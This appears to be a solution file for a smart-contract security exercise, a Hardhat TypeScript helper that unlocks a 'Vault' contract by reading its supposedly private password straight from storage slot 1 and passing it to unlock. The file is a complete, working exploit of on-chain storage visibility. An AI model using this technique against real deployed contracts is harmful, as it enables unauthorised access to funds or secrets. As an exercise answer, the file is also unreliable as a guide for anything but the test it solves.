import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  const result = await ethers.provider.getStorageAt(victim.address, 1);
  console.log(ethers.utils.toUtf8String(result));
  const transaction = await victim.unlock(result);
  await transaction.wait();
};

export default helper;
